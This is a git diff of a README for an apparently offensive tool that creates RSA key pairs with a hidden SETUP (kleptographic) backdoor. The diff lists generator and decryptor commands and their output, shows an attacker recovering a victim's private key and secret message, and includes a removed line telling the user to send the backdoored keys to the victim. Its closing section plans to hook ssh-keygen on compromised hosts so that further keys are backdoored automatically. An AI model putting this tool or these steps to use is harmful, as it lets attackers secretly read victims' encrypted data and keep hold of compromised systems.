@@ -21,36 +21,33 @@ openssl genrsa -out attacker_priv.pem 2048
 openssl rsa -in attacker_priv.pem -pubout -out attacker_pub.pem
 
 # generate backdoored keys
-./generator -pk attacker_pub.pem -o out
+./generator -pk attacker_pub.pem
 
 # output
-[*] Loading attacker's key...
-[+] Attacker's key loaded (N bit length: 2048)
-[*] Using bitsize: 512
+------
+[*] Generating 4096-bits SETUP...
+    > This may take a while...
+------
 
-[*] Generating SETUP RSA key pair...
-[*] This may take a while...
+------
+[*] Found parameters:
+    > p bit length: 256
+    > q bit length: 3840
+    > n bit length: 4096 // final key length
+    > Attempts needed: 542692
+------
 
-[+] Successfully generated backdoored key pair:
-[+]  p bit length: 256
-[+]  q bit length: 2303
-[+]  n bit length: 2559
-[i]  Attempts needed: 339872
+------
+[*] Backdoored keys saved to:
+    > Private key: out/victim_priv.pem
+    > Public key:  out/victim_pub.pem
+------
 
-[+] Backdoored keys saved to:
-[+]  Private key: out/victim_priv.pem
-[+]  Public key:  out/victim_pub.pem
-[*]  Metadata:    out/metadata.txt
-
-[+] SETUP backdoored key pair generated successfully!
-
-[i] To test encryption run:
-  echo -n "hello world" | openssl pkeyutl -encrypt -inkey out/victim_pub.pem -pubin -out out/cipher.bin
-
-[i] To test SETUP backdoor run:
-  ./decryptor -pk out/victim_pub.pem -sk attacker_priv.pem -c out/cipher.bin
-
-# Then send the backdoored keys generated in out/ to the victim
+------
+[*] Test with:
+    > echo -n "hello world" | openssl pkeyutl -encrypt -inkey out/victim_pub.pem -pubin -out out/cipher.bin // encrypt with SETUP PK
+    > ./decryptor -pk out/victim_pub.pem -sk <attacker_priv.pem> -c out/cipher.bin // decrypt with SK
+------
 ```
 
 If the victim trusts the keys received (which look perfectly normal and function as expected) they will use it to encrypt some data, e.g.: 
@@ -61,13 +58,6 @@ echo -n "SuperSecretSh1tttttt" | openssl pkeyutl -encrypt -inkey out/victim_pub.
 
 # verify
 echo out/cipher.bin | base64
-
-=> NDSvLhgN6Iix+t+ubGW/fe0brqaWNxuuS76QexxwPpgYxHLMmlGIYtGi7n6g8MjX84roJWuVt2Wg
-t+5rfPO4lvQLPUf4ax994WpQMdeNqxJjh7zApk4i9waTbiksJb09z5W+1n8ZsffsDiyOvvAp3y7H
-NZhtEYNL2ww3Na18TxChmQSy9DEDaxJAhlzkRVq9Pw6n8DmY5yJ1gOCNitPt/EmuB8WJl+DZy4Bq
-fjdZX7ZKNibxVr/LjRGzkn2gyGDrUSUHHT4Ay4t5mKie9Zjbk3HPcm4hsEb04XBRLVxv0TydK13t
-E5lBaJkB2xxrag2I1W6A1O1KYv07qmHH5qgOzJdFOIBGKh/2s27N/nCl1stgNESvgTHLd6rDrbif
-N32Qq2KjGI3rcfrgYw+SBNm+VF4ML2ZBIfTv/7Xtm5s50do=
 ```
 
 The twist is that the attacker can decrypt the message using the victim's public key and is own private key. E.g., 
@@ -77,28 +67,33 @@ The twist is that the attacker can decrypt the message using the victim's public
 ./decryptor -pk out/victim_pub.pem -sk attacker_priv.pem -c out/cipher.bin
 
 # output
-[*] Loading victim's public key...
-[*] Loading attacker's private key...
-[*] Loading ciphertext...
-[i] Auto-detected bitsize: 512
-[*] Extracting private key from SETUP backdoor...
-[+] Found valid factorization using s1
-[+] Recovered p (bit length: 256)
-[+] Recovered q (bit length: 2303)
-[+] Recovered d (bit length: 2559)
+------
+[*] Loading keys and ciphertext...
+    > Loaded victim public key
+    > Loaded attacker private key
+    > Loaded ciphertext
+------
 
-[+] Successfully extracted victim's private key!
-
-[*] Decrypting ciphertext...
+------
+[*] Deriving private key from SETUP...
+    > PK bitsize: 2048
+    > Found valid factorization using s1
+    > Recovered p (bit length: 256)
+    > Recovered q (bit length: 3840)
+    > Recovered d (bit length: 4092)
+------
 
 --- DECRYPTED MESSAGE ---
-��LV�����zFڟ%)�2rqC���e�n���e�y��Mw�rE'X��Bw�L6����+�H�>_��qI
-���^������P2��
-��/3O�1v7��.��O�E|\�~��i�z3m���^�lg̔n���ʏ�q��_/�T�*E��$�5���K����(�"�xfG������5�X#v�ɧ|zA�Ț��҂�C� ��c�vx��8�8T    �@����ݎ
-�$�;�2��.�SuperSecretSh1tttttt                                                                                         �1Vtj��e4�@}��1唩F��V�dDX�
+ ��ϓ�f�~~P�k(���t%Tp��i/3qHvr��s        �x��f����){���\c�f�
+�.���n�=y���
+�R}��r_2���q�H>u�K��%EB�,�yNZ���5�1��:�>��%O�Y/�,��J$a���`��
+                                      �ì�|��k&r��1�5H˚�+����U�/4p� ���֒9���#Gmծ����=�gfq��Pg,w�g)�E^���ͻ����-2�t�2-v
+        �y�.�Ȟ�<0S�i8�w�+�\���D/��/���e���sf?18��l�����Э�Y�
+�uk��D҃C�P�leS�<���Cy�oI�I�˴�O�B'
+g;L9{b�o.���y.���+J���
+2А�$�޶��WƇ�B���υk�D�SuperSecretSh1tttttt
 -------------------------
 ```
-
 
 ## How does it work ?
 
@@ -137,3 +132,7 @@ If you want the full details of this attack check the two links in the preamble.
 ## Improvements
 
 Currently the program uses ProbablyPrime() to check if a given n is prime. ProbablyPrime performs n Miller-Rabin tests to check whether x is prime. If it returns true, x is prime with probability 1 - 1/4^n. If it returns false, x is not prime. As such, there's a non-zero probability that the backdoor generation fails (Q can't be solved). Just rerun the tool if that's the case. 
+
+## Future works
+
+Support the following formats: `ssh-rsa, ssh-dsa, ssh-ecdsa`. SETUP is theorically possible for these, `ssh-ed25519` is resistant to SETUP. Private ssh key could then be derived from public keys grabbed with `ssh-keyscan`. I am also planning on providing a small utility to hook ssh-keygen on compromised host to automatically backdoor further keys... TBC.
